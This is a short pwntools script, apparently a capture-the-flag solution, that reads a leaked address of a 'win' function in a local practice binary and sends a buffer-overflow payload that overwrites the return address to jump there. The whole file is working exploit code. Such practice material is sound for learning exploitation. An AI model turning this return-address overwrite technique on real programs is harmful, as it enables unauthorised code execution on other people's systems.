from pwn import *
from exploit import exploit_source

p = exploit_source('./main.o', '', gdbscript="break main")
p.recvuntil("function at ")
win = int(p.recvuntil(" (win)", drop=True), 16)

success(f"win = {hex(win)}")

p.sendlineafter('Input:', flat({0x20: p64(0x8), 0x28: p64(win + 5)}))
p.sendlineafter("Go again? (Y/N)", "N")
p.interactive()